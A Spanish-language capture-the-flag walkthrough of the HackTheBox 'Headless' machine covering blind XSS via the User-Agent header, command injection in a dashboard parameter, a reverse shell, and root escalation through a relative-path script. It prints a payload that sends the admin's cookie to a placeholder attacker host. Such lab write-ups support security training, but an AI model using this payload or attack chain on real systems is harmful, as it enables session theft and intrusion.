--- 
title: "Headless" 
platform: "Hackthebox"
date: "2026-02-27" 
difficulty: "Easy" 
os: "linux" 
description: "Resolución de la máquina Analysis de HackTheBox." 
---
#linux #easy 

-----------
Headless es una máquina Linux de dificultad fácil que ilustra los peligros de confiar ciegamente en las cabeceras HTTP enviadas por el usuario. La intrusión se logra mediante un XSS ciego en la cabecera User-Agent para secuestrar la sesión administrativa, seguido de una inyección de comandos en un panel de control. La escalada de privilegios final aprovecha un script de sistema que ejecuta un archivo de inicialización con una ruta relativa vulnerable.

1. Fase de Reconocimiento y Enumeración
Iniciamos con un escaneo de puertos para identificar los servicios activos y sus versiones:

![[Pasted image 20240325102735.png]]
![[Pasted image 20240325102754.png]]

Analizamos el banner del servicio SSH para determinar la distribución de Linux subyacente (Ubuntu) a través de Launchpad:

![[Pasted image 20240325102927.png]]

Identificamos un servidor web en el puerto 5000. Al explorar la web, encontramos una interfaz muy simple. Procedemos a interceptar el tráfico con Burp Suite para buscar vectores de inyección.

![[Pasted image 20240325103755.png]]
![[Pasted image 20240325104133.png]]

Descubrimiento de Rutas
Utilizamos dirsearch para localizar directorios ocultos, identificando la ruta /dashboard. Al intentar acceder, recibimos una denegación de acceso (403 Forbidden), lo que indica que es un área restringida para administradores.

![[Pasted image 20240325103924.png]]
![[Pasted image 20240325104005.png]]

2. Explotación Web: Blind XSS y Secuestro de Sesión
Al interactuar con el formulario de contacto, detectamos que el servidor registra y visualiza las cabeceras HTTP en un panel interno. Inyectamos un payload de Blind XSS en la cabecera User-Agent diseñada para exfiltrar la cookie de sesión del administrador hacia nuestro servidor:

JavaScript
`<img src=x onerror=fetch('http://TU_IP/?c='+document.cookie);>`
Codificamos el payload en formato URL para asegurar que sea procesado correctamente:

![[Pasted image 20240325105834.png]]

Al recibir la petición en nuestro listener, obtenemos la cookie is_admin, que nos otorga acceso total al panel de control:

![[Pasted image 20240325105926.png]]

3. Intrusión: Inyección de Comandos (RCE)
Con la cookie secuestrada, accedemos a /dashboard. Identificamos una funcionalidad de reporte que utiliza un parámetro llamado date. Tras realizar pruebas de inyección, confirmamos que es vulnerable a RCE (Remote Code Execution).

![[Pasted image 20240325110104.png]]
![[Pasted image 20240325110218.png]]

Validamos la ejecución de comandos mediante una petición curl que llega a nuestra máquina de ataque:

![[Pasted image 20240325110914.png]]
![[Pasted image 20240325110941.png]]

Obtención de Shell Inicial
Preparamos un script de reverse shell en nuestra máquina kali, nos ponemos en escucha en el puerto 4444 y forzamos al servidor victima a ejecutarlo.

![[Pasted image 20240325112359.png]]
![[Pasted image 20240325112554.png]]
![[Pasted image 20240325112530.png]]

¡Conseguimos acceso inicial como usuario!

4. Escalada de Privilegios: Script Hijacking
Enumeramos los privilegios del usuario y descubrimos que podemos ejecutar un script de sistema llamado syscheck con permisos de root sin proporcionar contraseña.

![[Pasted image 20240325114418.png]]
![[Pasted image 20240325112629.png]]

Al inspeccionar el código de syscheck, observamos que realiza una llamada a un script de inicialización llamado initdb.sh sin especificar una ruta absoluta.

![[Pasted image 20240325112948.png]]

Abuso de Script de Inicialización
Dado que podemos crear archivos en el directorio actual, creamos nuestro propio initdb.sh. En su interior, incluimos un comando para asignar el bit SUID al binario de /bin/bash. Al ejecutar syscheck con sudo, este invocará nuestro script malicioso con privilegios de superusuario.

![[Pasted image 20240325114951.png]]
![[Pasted image 20240325115022.png]]

Finalmente, ejecutamos bash -p para obtener una shell de root y capturar la flag final.

![[Pasted image 20240325114858.png]]

Máquina Headless comprometida. 🚀